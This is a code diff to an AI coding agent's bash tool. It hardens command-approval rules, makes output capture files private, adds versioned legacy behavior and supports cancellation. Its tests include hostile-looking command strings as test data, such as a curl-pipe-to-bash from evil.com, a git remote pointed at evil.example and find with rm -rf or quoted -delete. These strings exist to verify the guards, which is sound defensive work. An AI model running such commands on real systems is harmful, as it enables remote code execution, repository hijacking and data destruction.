@@ -131,14 +131,17 @@ use serde::{Deserialize, Serialize};
 use tokio::io::{AsyncRead, AsyncReadExt, AsyncWriteExt};
 use tokio::process::Command;
 use tokio::time::timeout;
+use tokio_util::sync::CancellationToken;
 
 use super::details::BashDetails;
 use super::process_utils::{kill_process_tree, set_new_process_group};
 use super::shell_env::resolve_shell_environment;
 use crate::agent::ToolResult;
 use crate::ai::Tool;
-use crate::safety::analyze_bash_command;
+use crate::safety::{analyze_bash_command, git_args_are_mutating, tokenize};
 use crate::sandbox::{spawn_sandboxed_command, SandboxPolicy};
+
+mod versions;
 
 /// Default timeout for bash commands (2 minutes)
 const DEFAULT_TIMEOUT_MS: u64 = 120_000;
@@ -148,6 +151,185 @@ const MAX_TIMEOUT_MS: u64 = 600_000;
 const MAX_OUTPUT_SIZE: usize = 30_000;
 /// Maximum lines to show in truncated output
 const MAX_OUTPUT_LINES: usize = 500;
+
+/// Contract version of the bash tool's observable behavior.
+///
+/// Follows the grok-build versioned-implementation pattern: current behavior
+/// stays in this module; each pinned legacy contract lives in its own module
+/// under `versions/`. The selected version is stamped into `BashDetails`, so
+/// tool receipts and session entries record which behavior produced a result
+/// and session replay can pin the same behavior via
+/// `ToolExecutor::pin_tool_version`.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
+pub enum BashVersion {
+    /// Latest behavior. A moving alias: its meaning changes as the tool
+    /// evolves, so receipts always record the resolved string.
+    #[default]
+    Current,
+    /// Pre-#3070 behavior (see `versions/legacy_1.rs`): world-readable temp
+    /// captures in the system temp dir, and pre-hardening auto-approval.
+    Legacy1,
+}
+
+impl BashVersion {
+    /// Resolve a recorded contract version string (e.g. from a session
+    /// entry's receipt details) into a version. Unknown or missing values
+    /// fall back to `Current`.
+    #[must_use]
+    pub fn from_contract(contract: Option<&str>) -> Self {
+        match contract {
+            Some("legacy-1") => Self::Legacy1,
+            _ => Self::Current,
+        }
+    }
+
+    /// The contract version string recorded in receipt details.
+    #[must_use]
+    pub fn as_str(self) -> &'static str {
+        match self {
+            Self::Current => "current",
+            Self::Legacy1 => "legacy-1",
+        }
+    }
+
+    /// Version-aware approval classification, dispatching to the pinned
+    /// behavior module.
+    #[must_use]
+    pub fn requires_approval(self, command: &str) -> bool {
+        match self {
+            Self::Current => current_requires_approval(command),
+            Self::Legacy1 => versions::legacy_1::requires_approval(command),
+        }
+    }
+}
+
+/// Current approval classification.
+///
+/// This is the up-to-date dynamic approval logic; pinned legacy behavior
+/// lives in `versions/legacy_1.rs` and is selected via
+/// [`BashVersion::requires_approval`].
+fn current_requires_approval(command: &str) -> bool {
+    fn is_find_with_exec(cmd_trimmed: &str) -> bool {
+        if !cmd_trimmed.starts_with("find ") && cmd_trimmed != "find" {
+            return false;
+        }
+
+        // Tokenize quote-aware so `find . "-delete"` cannot hide its
+        // flags behind quotes and slip past this guard.
+        tokenize(cmd_trimmed)
+            .iter()
+            .map(|token| {
+                token
+                    .to_lowercase()
+                    .trim_end_matches([';', '+', '\\'])
+                    .to_string()
+            })
+            .any(|token| {
+                matches!(
+                    token.as_str(),
+                    "-exec" | "-execdir" | "-ok" | "-okdir" | "-delete"
+                )
+            })
+    }
+
+    fn is_safe_segment(cmd_trimmed: &str) -> bool {
+        if cmd_trimmed.is_empty() {
+            return false;
+        }
+
+        if is_find_with_exec(cmd_trimmed) {
+            return false;
+        }
+
+        // Commands that are always safe (read-only)
+        let safe_prefixes = [
+            "ls ",
+            "ls\n",
+            "cat ",
+            "head ",
+            "tail ",
+            "grep ",
+            "find ",
+            "pwd",
+            "echo ",
+            "which ",
+            "type ",
+            "file ",
+            "stat ",
+            "wc ",
+            "du ",
+            "df ",
+            "env",
+            "printenv",
+            "date",
+            "whoami",
+            "hostname",
+            "uname",
+            "git status",
+            "git log",
+            "git diff",
+            "git branch",
+            "git remote",
+            "git show",
+            "cargo --version",
+            "rustc --version",
+            "node --version",
+            "npm --version",
+            "bun --version",
+            "python --version",
+        ];
+
+        for prefix in safe_prefixes {
+            if cmd_trimmed.starts_with(prefix) || cmd_trimmed == prefix.trim() {
+                // `git branch`/`git remote` are read-only only for certain
+                // arguments; `git branch -D` or `git remote set-url` mutate.
+                if prefix == "git branch" || prefix == "git remote" {
+                    let tokens = tokenize(cmd_trimmed);
+                    if let Some(subcommand) = tokens.get(1) {
+                        if git_args_are_mutating(&subcommand.to_lowercase(), &tokens[2..]) {
+                            return false;
+                        }
+                    }
+                }
+                return true;
+            }
+        }
+
+        false
+    }
+
+    // Commands that are always safe (read-only)
+    let cmd_trimmed = command.trim();
+
+    if cmd_trimmed.is_empty() {
+        return true;
+    }
+
+    let analysis = analyze_bash_command(cmd_trimmed);
+
+    if analysis.has_command_substitution || analysis.has_background {
+        return true;
+    }
+
+    if analysis.has_redirects && cmd_trimmed.contains('>') {
+        return true;
+    }
+
+    if analysis.commands.is_empty() {
+        return true;
+    }
+
+    if analysis
+        .commands
+        .iter()
+        .all(|cmd| is_safe_segment(cmd.raw.trim()))
+    {
+        return false;
+    }
+
+    // Everything else requires approval
+    true
+}
 
 pub(crate) fn resolve_shell_config() -> Result<(String, Vec<String>), String> {
     #[cfg(windows)]
@@ -252,15 +434,93 @@ pub(crate) fn resolve_shell_config() -> Result<(String, Vec<String>), String> {
     }
 }
 
+/// Directory holding full bash output captures.
+///
+/// Kept under the maestro state dir (mode 0700 on unix) instead of the
+/// shared system temp dir so command output is not world-readable.
+fn bash_output_dir() -> PathBuf {
+    let dir = dirs::home_dir().map_or_else(
+        || std::env::temp_dir().join("composer-bash-output"),
+        |home| home.join(".composer").join("logs").join("bash-output"),
+    );
+    if std::fs::create_dir_all(&dir).is_ok() {
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            let _ = std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o700));
+        }
+    }
+    dir
+}
+
+/// Delete stale full-output captures (older than a day) on a best-effort
+/// basis so the state dir does not accumulate old command output forever.
+fn sweep_old_temp_files(dir: &Path) {
+    use std::time::{Duration, SystemTime};
+
+    const MAX_AGE: Duration = Duration::from_hours(24);
+
+    let Ok(entries) = std::fs::read_dir(dir) else {
+        return;
+    };
+    let now = SystemTime::now();
+    for entry in entries.flatten() {
+        let name = entry.file_name();
+        let Some(name) = name.to_str() else {
+            continue;
+        };
+        if !name.starts_with("composer-bash-") || !name.ends_with(".log") {
+            continue;
+        }
+        let age = entry
+            .metadata()
+            .and_then(|meta| meta.modified())
+            .ok()
+            .and_then(|modified| now.duration_since(modified).ok());
+        if age.is_some_and(|age| age > MAX_AGE) {
+            let _ = std::fs::remove_file(entry.path());
+        }
+    }
+}
+
+/// Create a temp output file readable only by the current user.
+async fn create_private_temp_file(path: &Path) -> std::io::Result<tokio::fs::File> {
+    let mut options = tokio::fs::OpenOptions::new();
+    options.write(true).create(true).truncate(true);
+    #[cfg(unix)]
+    options.mode(0o600);
+    options.open(path).await
+}
+
+/// Create the full-output capture file using the semantics of the selected
+/// behavior version: private 0600 file for `Current`, default-permission
+/// file for `Legacy1`.
+async fn create_capture_file(
+    path: &Path,
+    version: BashVersion,
+) -> std::io::Result<tokio::fs::File> {
+    match version {
+        BashVersion::Current => create_private_temp_file(path).await,
+        BashVersion::Legacy1 => versions::legacy_1::create_capture_file(path).await,
+    }
+}
+
 /// Generate a unique temp file path for storing large bash output.
 ///
-/// Creates a path in the system temp directory with a random ID to avoid conflicts.
-/// The file is prefixed with "composer-bash-" for easy identification and cleanup.
+/// For `Current`, creates a path under the private maestro state dir with a
+/// random ID to avoid conflicts, sweeping stale captures first. For
+/// `Legacy1`, delegates to the legacy behavior (shared system temp dir, no
+/// sweep). The file is prefixed with "composer-bash-" for easy
+/// identification and cleanup.
 ///
 /// # Returns
 ///
 /// A `PathBuf` pointing to a unique temp file location.
-fn get_temp_file_path() -> PathBuf {
+fn get_temp_file_path(version: BashVersion) -> PathBuf {
+    if version == BashVersion::Legacy1 {
+        return versions::legacy_1::temp_capture_path();
+    }
+
     use std::time::{SystemTime, UNIX_EPOCH};
 
     let timestamp = SystemTime::now()
@@ -269,7 +529,9 @@ fn get_temp_file_path() -> PathBuf {
         .as_nanos();
     let pid = std::process::id();
 
-    std::env::temp_dir().join(format!("composer-bash-{pid}-{timestamp}.log"))
+    let dir = bash_output_dir();
+    sweep_old_temp_files(&dir);
+    dir.join(format!("composer-bash-{pid}-{timestamp}.log"))
 }
 
 struct StreamCapture {
@@ -280,10 +542,11 @@ struct StreamCapture {
     last_byte: Option<u8>,
     temp_path: Option<PathBuf>,
     temp_file: Option<tokio::fs::File>,
+    version: BashVersion,
 }
 
 impl StreamCapture {
-    fn new() -> Self {
+    fn new(version: BashVersion) -> Self {
         Self {
             buffer: Vec::new(),
             tail: VecDeque::new(),
@@ -292,6 +555,7 @@ impl StreamCapture {
             last_byte: None,
             temp_path: None,
             temp_file: None,
+            version,
         }
     }
 
@@ -314,8 +578,8 @@ impl StreamCapture {
         if self.temp_file.is_none()
             && (self.total_bytes > MAX_OUTPUT_SIZE || self.total_lines > MAX_OUTPUT_LINES)
         {
-            let temp_path = get_temp_file_path();
-            match tokio::fs::File::create(&temp_path).await {
+            let temp_path = get_temp_file_path(self.version);
+            match create_capture_file(&temp_path, self.version).await {
                 Ok(mut file) => {
                     file.write_all(&self.buffer).await?;
                     self.buffer.clear();
@@ -354,8 +618,9 @@ impl StreamCapture {
 
 async fn read_stream_with_limits<R: AsyncRead + Unpin>(
     mut reader: R,
+    version: BashVersion,
 ) -> std::io::Result<StreamCapture> {
-    let mut capture = StreamCapture::new();
+    let mut capture = StreamCapture::new(version);
     let mut buf = [0u8; 8_192];
 
     loop {
@@ -452,7 +717,11 @@ struct CombinedOutput {
     temp_path: Option<String>,
 }
 
-async fn build_combined_output(stdout: &StreamCapture, stderr: &StreamCapture) -> CombinedOutput {
+async fn build_combined_output(
+    stdout: &StreamCapture,
+    stderr: &StreamCapture,
+    version: BashVersion,
+) -> CombinedOutput {
     let mut output = stdout.tail_string();
 
     let stderr_has_output = stderr.total_bytes > 0;
@@ -493,9 +762,9 @@ async fn build_combined_output(stdout: &StreamCapture, stderr: &StreamCapture) -
     let mut saved_path = None;
     let mut combined_cleanup = None;
     if stdout.has_full_output() && stderr.has_full_output() {
-        let combined_path = get_temp_file_path();
+        let combined_path = get_temp_file_path(version);
         combined_cleanup = Some(combined_path.clone());
-        let mut combined_file = match tokio::fs::File::create(&combined_path).await {
+        let mut combined_file = match create_capture_file(&combined_path, version).await {
             Ok(file) => Some(file),
             Err(e) => {
                 eprintln!("Failed to write temp output file: {e}");
@@ -627,6 +896,8 @@ pub struct BashTool {
     shell_error: Option<String>,
     /// Native OS policy applied before shell commands execute.
     sandbox_policy: Option<SandboxPolicy>,
+    /// Behavior contract version this instance executes with.
+    version: BashVersion,
 }
 
 impl BashTool {
@@ -642,7 +913,28 @@ impl BashTool {
             shell_args,
             shell_error,
             sandbox_policy: None,
+            version: BashVersion::default(),
         }
+    }
+
+    /// Pin the behavior contract version (e.g. from a session receipt during
+    /// replay). The version governs approval classification and output
+    /// capture semantics, and is stamped into `BashDetails` on every result.
+    #[must_use]
+    pub fn with_version(mut self, version: BashVersion) -> Self {
+        self.version = version;
+        self
+    }
+
+    /// The behavior contract version this instance executes with.
+    #[must_use]
+    pub fn version(&self) -> BashVersion {
+        self.version
+    }
+
+    /// Stamp receipt details with this instance's behavior version.
+    fn stamp_details(&self, details: BashDetails) -> BashDetails {
+        details.with_version(self.version.as_str())
     }
 
     /// Apply a fail-closed native sandbox to every shell command.
@@ -722,115 +1014,7 @@ impl BashTool {
     /// ```rust,ignore
     #[must_use]
     pub fn requires_approval(command: &str) -> bool {
-        fn is_find_with_exec(cmd_trimmed: &str) -> bool {
-            if !cmd_trimmed.starts_with("find ") && cmd_trimmed != "find" {
-                return false;
-            }
-
-            cmd_trimmed
-                .split_whitespace()
-                .map(|token| {
-                    token
-                        .to_lowercase()
-                        .trim_end_matches([';', '+', '\\'])
-                        .to_string()
-                })
-                .any(|token| {
-                    matches!(
-                        token.as_str(),
-                        "-exec" | "-execdir" | "-ok" | "-okdir" | "-delete"
-                    )
-                })
-        }
-
-        fn is_safe_segment(cmd_trimmed: &str) -> bool {
-            if cmd_trimmed.is_empty() {
-                return false;
-            }
-
-            if is_find_with_exec(cmd_trimmed) {
-                return false;
-            }
-
-            // Commands that are always safe (read-only)
-            let safe_prefixes = [
-                "ls ",
-                "ls\n",
-                "cat ",
-                "head ",
-                "tail ",
-                "grep ",
-                "find ",
-                "pwd",
-                "echo ",
-                "which ",
-                "type ",
-                "file ",
-                "stat ",
-                "wc ",
-                "du ",
-                "df ",
-                "env",
-                "printenv",
-                "date",
-                "whoami",
-                "hostname",
-                "uname",
-                "git status",
-                "git log",
-                "git diff",
-                "git branch",
-                "git remote",
-                "git show",
-                "cargo --version",
-                "cargo check",
-                "rustc --version",
-                "node --version",
-                "npm --version",
-                "bun --version",
-                "python --version",
-            ];
-
-            for prefix in safe_prefixes {
-                if cmd_trimmed.starts_with(prefix) || cmd_trimmed == prefix.trim() {
-                    return true;
-                }
-            }
-
-            false
-        }
-
-        // Commands that are always safe (read-only)
-        let cmd_trimmed = command.trim();
-
-        if cmd_trimmed.is_empty() {
-            return true;
-        }
-
-        let analysis = analyze_bash_command(cmd_trimmed);
-
-        if analysis.has_command_substitution || analysis.has_background {
-            return true;
-        }
-
-        if analysis.has_redirects && cmd_trimmed.contains('>') {
-            return true;
-        }
-
-        if analysis.commands.is_empty() {
-            return true;
-        }
-
-        if analysis
-            .commands
-            .iter()
-            .all(|cmd| is_safe_segment(cmd.raw.trim()))
-        {
-            return false;
-        }
-
-        // Everything else requires approval
-        true
+        BashVersion::Current.requires_approval(command)
     }
 
     /// Check if a command contains dangerous patterns that should be blocked
@@ -971,6 +1155,19 @@ impl BashTool {
     /// # }
     /// ```rust,ignore
     pub async fn execute(&self, args: BashArgs) -> ToolResult {
+        self.execute_with_cancellation(args, None).await
+    }
+
+    /// Execute a command, killing the process tree early if `cancel` fires.
+    ///
+    /// Used by the TUI event loop, where tool execution runs on a background
+    /// task and Ctrl+C must interrupt a long-running command instead of
+    /// waiting for its timeout.
+    pub async fn execute_with_cancellation(
+        &self,
+        args: BashArgs,
+        cancel: Option<CancellationToken>,
+    ) -> ToolResult {
         if let Some(message) = &self.shell_error {
             return ToolResult::failure(message.clone());
         }
@@ -1029,9 +1226,11 @@ impl BashTool {
         let mut child = match spawn_result {
             Ok(c) => c,
             Err(e) => {
-                let details = BashDetails::failed(&args.command, -1)
-                    .with_cwd(cwd_string.clone())
-                    .with_duration(start_time.elapsed().as_millis() as u64);
+                let details = self.stamp_details(
+                    BashDetails::failed(&args.command, -1)
+                        .with_cwd(cwd_string.clone())
+                        .with_duration(start_time.elapsed().as_millis() as u64),
+                );
                 if let Some(ref desc) = args.description {
                     return ToolResult::failure(format!("Failed to spawn process: {e}"))
                         .with_details(details.with_description(desc).to_json());
@@ -1061,9 +1260,11 @@ impl BashTool {
                 }
             });
 
-            let mut details = BashDetails::background(&args.command, child_pid.unwrap_or(0))
-                .with_cwd(cwd_string.clone())
-                .with_duration(start_time.elapsed().as_millis() as u64);
+            let mut details = self.stamp_details(
+                BashDetails::background(&args.command, child_pid.unwrap_or(0))
+                    .with_cwd(cwd_string.clone())
+                    .with_duration(start_time.elapsed().as_millis() as u64),
+            );
             if let Some(ref desc) = args.description {
                 details = details.with_description(desc);
             }
@@ -1074,7 +1275,7 @@ impl BashTool {
         }
 
         // Wait for completion with timeout
-        let result = timeout(Duration::from_millis(timeout_ms), async {
+        let wait = timeout(Duration::from_millis(timeout_ms), async {
             let stdout = match child.stdout.take() {
                 Some(s) => s,
                 None => {
@@ -1098,28 +1299,58 @@ impl BashTool {
 
             // Read stdout and stderr concurrently with streaming limits
             let (stdout_result, stderr_result, status) = tokio::join!(
-                read_stream_with_limits(stdout),
-                read_stream_with_limits(stderr),
+                read_stream_with_limits(stdout, self.version),
+                read_stream_with_limits(stderr, self.version),
                 child.wait()
             );
 
             (stdout_result, stderr_result, status)
-        })
-        .await;
+        });
+
+        // Cancellation (TUI Ctrl+C) kills the process tree exactly like a
+        // timeout does, so shell children cannot be orphaned.
+        let result = match cancel {
+            Some(token) => match tokio::select! {
+                result = wait => Some(result),
+                () = token.cancelled() => None,
+            } {
+                Some(result) => result,
+                None => {
+                    if let Some(pid) = child_pid {
+                        kill_process_tree(pid);
+                    } else {
+                        let _ = child.kill().await;
+                    }
+                    // Best-effort reap to avoid zombies
+                    let _ = timeout(Duration::from_secs(1), child.wait()).await;
+                    let mut details = self.stamp_details(
+                        BashDetails::failed(&args.command, 130) // 130 = SIGINT
+                            .with_cwd(cwd_string)
+                            .with_duration(start_time.elapsed().as_millis() as u64),
+                    );
+                    if let Some(ref desc) = args.description {
+                        details = details.with_description(desc);
+                    }
+                    return ToolResult::failure("Command cancelled".to_string())
+                        .with_details(details.to_json());
+                }
+            },
+            None => wait.await,
+        };
 
         match result {
             Ok((Ok(stdout), Ok(stderr), Ok(status))) => {
-                let combined = build_combined_output(&stdout, &stderr).await;
+                let combined = build_combined_output(&stdout, &stderr, self.version).await;
 
                 let exit_code = status.code().unwrap_or(-1);
                 let duration_ms = start_time.elapsed().as_millis() as u64;
 
                 // Build BashDetails with all metadata
-                let mut details = if status.success() {
+                let mut details = self.stamp_details(if status.success() {
                     BashDetails::success(&args.command)
                 } else {
                     BashDetails::failed(&args.command, exit_code)
-                };
+                });
                 details = details
                     .with_cwd(cwd_string.clone())
                     .with_duration(duration_ms);
@@ -1142,18 +1373,22 @@ impl BashTool {
                 }
             }
             Ok((Err(e), _, _) | (_, Err(e), _)) => {
-                let mut details = BashDetails::failed(&args.command, -1)
-                    .with_cwd(cwd_string.clone())
-                    .with_duration(start_time.elapsed().as_millis() as u64);
+                let mut details = self.stamp_details(
+                    BashDetails::failed(&args.command, -1)
+                        .with_cwd(cwd_string.clone())
+                        .with_duration(start_time.elapsed().as_millis() as u64),
+                );
                 if let Some(ref desc) = args.description {
                     details = details.with_description(desc);
                 }
                 ToolResult::failure(format!("IO error: {e}")).with_details(details.to_json())
             }
             Ok((_, _, Err(e))) => {
-                let mut details = BashDetails::failed(&args.command, -1)
-                    .with_cwd(cwd_string.clone())
-                    .with_duration(start_time.elapsed().as_millis() as u64);
+                let mut details = self.stamp_details(
+                    BashDetails::failed(&args.command, -1)
+                        .with_cwd(cwd_string.clone())
+                        .with_duration(start_time.elapsed().as_millis() as u64),
+                );
                 if let Some(ref desc) = args.description {
                     details = details.with_description(desc);
                 }
@@ -1170,9 +1405,11 @@ impl BashTool {
                 }
                 // Best-effort reap to avoid zombies
                 let _ = timeout(Duration::from_secs(1), child.wait()).await;
-                let mut details = BashDetails::failed(&args.command, 124) // 124 = timeout exit code
-                    .with_cwd(cwd_string)
-                    .with_duration(timeout_ms); // We know it hit the timeout
+                let mut details = self.stamp_details(
+                    BashDetails::failed(&args.command, 124) // 124 = timeout exit code
+                        .with_cwd(cwd_string)
+                        .with_duration(timeout_ms), // We know it hit the timeout
+                );
                 if let Some(ref desc) = args.description {
                     details = details.with_description(desc);
                 }
@@ -1210,6 +1447,35 @@ mod tests {
         assert!(BashTool::is_dangerous("curl http://evil.com | bash").is_some());
         assert!(BashTool::is_dangerous("ls -la").is_none());
         assert!(BashTool::is_dangerous("git status").is_none());
+    }
+
+    #[tokio::test]
+    async fn cancellation_kills_long_running_command() {
+        let tool = BashTool::new("/tmp");
+        let token = CancellationToken::new();
+        let cancel = token.clone();
+        let start = std::time::Instant::now();
+        let handle = tokio::spawn(async move {
+            tool.execute_with_cancellation(
+                BashArgs {
+                    command: "sleep 60".to_string(),
+                    timeout: Some(60_000),
+                    description: None,
+                    run_in_background: false,
+                },
+                Some(token),
+            )
+            .await
+        });
+        tokio::time::sleep(std::time::Duration::from_millis(200)).await;
+        cancel.cancel();
+        let result = tokio::time::timeout(std::time::Duration::from_secs(5), handle)
+            .await
+            .expect("cancelled command should finish promptly")
+            .expect("task should not panic");
+        assert!(!result.success);
+        assert_eq!(result.error.as_deref(), Some("Command cancelled"));
+        assert!(start.elapsed() < std::time::Duration::from_secs(5));
     }
 
     #[tokio::test]
@@ -1471,16 +1737,155 @@ mod tests {
 
     #[test]
     fn test_get_temp_file_path_unique() {
-        let path1 = super::get_temp_file_path();
+        let path1 = super::get_temp_file_path(BashVersion::Current);
         std::thread::sleep(std::time::Duration::from_nanos(100)); // Ensure different timestamp
-        let path2 = super::get_temp_file_path();
+        let path2 = super::get_temp_file_path(BashVersion::Current);
 
         // Paths should be different
         assert_ne!(path1, path2);
-        // Should be in temp directory
-        assert!(path1.starts_with(std::env::temp_dir()));
+        // Should live in the private bash-output state dir, not the shared
+        // system temp dir (unless no home dir is available).
+        if dirs::home_dir().is_some() {
+            let dir = path1.parent().unwrap();
+            assert!(dir.ends_with(".composer/logs/bash-output"));
+            assert!(!path1.starts_with(std::env::temp_dir()));
+        }
         // Should have our prefix
         assert!(path1.to_string_lossy().contains("composer-bash-"));
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn test_bash_output_dir_is_owner_only() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let dir = super::bash_output_dir();
+        let mode = std::fs::metadata(&dir).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o700);
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn test_temp_output_file_is_owner_only() {
+        use std::os::unix::fs::PermissionsExt;
+
+        let path = super::get_temp_file_path(BashVersion::Current);
+        let file = super::create_private_temp_file(&path).await.unwrap();
+        drop(file);
+
+        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
+        assert_eq!(mode, 0o600);
+
+        let _ = std::fs::remove_file(&path);
+    }
+
+    // ============================================================
+    // Behavior Version Tests
+    // ============================================================
+
+    #[test]
+    fn test_version_from_contract_round_trip() {
+        assert_eq!(BashVersion::from_contract(None), BashVersion::Current);
+        assert_eq!(
+            BashVersion::from_contract(Some("current")),
+            BashVersion::Current
+        );
+        assert_eq!(
+            BashVersion::from_contract(Some("legacy-1")),
+            BashVersion::Legacy1
+        );
+        // Unknown versions fall back to current rather than failing.
+        assert_eq!(
+            BashVersion::from_contract(Some("legacy-99")),
+            BashVersion::Current
+        );
+        assert_eq!(BashVersion::Current.as_str(), "current");
+        assert_eq!(BashVersion::Legacy1.as_str(), "legacy-1");
+    }
+
+    #[test]
+    fn test_static_requires_approval_matches_current_version() {
+        // The static helper (used by the approval UI) is always current
+        // behavior; pinned versions go through BashVersion::requires_approval.
+        for cmd in ["ls -la", "cargo check", "git branch -D feature"] {
+            assert_eq!(
+                BashTool::requires_approval(cmd),
+                BashVersion::Current.requires_approval(cmd),
+                "static helper should match current behavior for {cmd:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn test_capture_path_differs_by_version() {
+        let current = super::get_temp_file_path(BashVersion::Current);
+        let legacy = super::get_temp_file_path(BashVersion::Legacy1);
+        assert!(legacy.starts_with(std::env::temp_dir()));
+        if dirs::home_dir().is_some() {
+            assert!(!current.starts_with(std::env::temp_dir()));
+            assert!(current
+                .parent()
+                .unwrap()
+                .ends_with(".composer/logs/bash-output"));
+        }
+    }
+
+    #[tokio::test]
+    async fn test_details_record_current_version_by_default() {
+        let tool = BashTool::new(".");
+        let result = tool
+            .execute(BashArgs {
+                command: "echo hello".to_string(),
+                timeout: None,
+                description: None,
+                run_in_background: false,
+            })
+            .await;
+
+        assert!(result.success);
+        let details = BashDetails::from_json(&result.details.unwrap()).unwrap();
+        assert_eq!(details.version, "current");
+    }
+
+    #[tokio::test]
+    async fn test_details_record_legacy_version_when_pinned() {
+        let tool = BashTool::new(".").with_version(BashVersion::Legacy1);
+        let result = tool
+            .execute(BashArgs {
+                command: "echo hello".to_string(),
+                timeout: None,
+                description: None,
+                run_in_background: false,
+            })
+            .await;
+
+        assert!(result.success);
+        let details = BashDetails::from_json(&result.details.unwrap()).unwrap();
+        assert_eq!(details.version, "legacy-1");
+    }
+
+    #[tokio::test]
+    async fn test_legacy_large_output_capture_lands_in_system_temp_dir() {
+        let tool = BashTool::new(".").with_version(BashVersion::Legacy1);
+        let result = tool
+            .execute(BashArgs {
+                command: "yes 'x' | head -n 50000".to_string(),
+                timeout: Some(5000),
+                description: None,
+                run_in_background: false,
+            })
+            .await;
+
+        assert!(result.success);
+        let details = BashDetails::from_json(&result.details.unwrap()).unwrap();
+        assert_eq!(details.version, "legacy-1");
+        let full_output_path = details
+            .full_output_path
+            .expect("truncated output should record a capture path");
+        let capture = std::path::PathBuf::from(&full_output_path);
+        assert!(capture.starts_with(std::env::temp_dir()));
+        assert!(capture.exists());
+        let _ = std::fs::remove_file(&capture);
     }
 
     // ============================================================
@@ -1585,8 +1990,27 @@ mod tests {
         assert!(!BashTool::requires_approval("git log"));
         assert!(!BashTool::requires_approval("git diff"));
         assert!(!BashTool::requires_approval("git branch"));
+        assert!(!BashTool::requires_approval("git branch -a"));
+        assert!(!BashTool::requires_approval("git branch --show-current"));
         assert!(!BashTool::requires_approval("git remote"));
+        assert!(!BashTool::requires_approval("git remote -v"));
+        assert!(!BashTool::requires_approval("git remote get-url origin"));
         assert!(!BashTool::requires_approval("git show HEAD"));
+    }
+
+    #[test]
+    fn test_requires_approval_git_mutating_args() {
+        assert!(BashTool::requires_approval("git branch -D feature"));
+        assert!(BashTool::requires_approval("git branch -d feature"));
+        assert!(BashTool::requires_approval("git branch new-branch"));
+        assert!(BashTool::requires_approval(
+            "git remote set-url origin https://evil.example/repo.git"
+        ));
+        assert!(BashTool::requires_approval(
+            "git remote add origin https://evil.example/repo.git"
+        ));
+        assert!(BashTool::requires_approval("git remote remove origin"));
+        assert!(BashTool::requires_approval("git remote prune origin"));
     }
 
     #[test]
@@ -1601,7 +2025,10 @@ mod tests {
 
     #[test]
     fn test_requires_approval_cargo_check() {
-        assert!(!BashTool::requires_approval("cargo check"));
+        // cargo check runs build scripts and proc macros, so it is not
+        // read-only and must require approval like cargo build.
+        assert!(BashTool::requires_approval("cargo check"));
+        assert!(BashTool::requires_approval("cargo check --all-targets"));
     }
 
     #[test]
@@ -1612,6 +2039,14 @@ mod tests {
         assert!(BashTool::requires_approval("echo hello > out.txt"));
         assert!(BashTool::requires_approval("ls | tee out.txt"));
         assert!(BashTool::requires_approval("find . -exec rm -rf {} +"));
+        // Quoted find flags must not bypass the exec/delete guard.
+        assert!(BashTool::requires_approval("find . \"-delete\""));
+        assert!(BashTool::requires_approval("find . '-delete'"));
+        assert!(BashTool::requires_approval("find . \"-exec\" rm {} \\;"));
+        assert!(BashTool::requires_approval(
+            "find . -name '*.tmp' \"-delete\""
+        ));
+        assert!(BashTool::requires_approval("find . \"-execdir\" rm {} +"));
         assert!(!BashTool::requires_approval("cat < input.txt"));
         assert!(!BashTool::requires_approval("cat file.txt | grep pattern"));
         assert!(!BashTool::requires_approval("ls && pwd"));
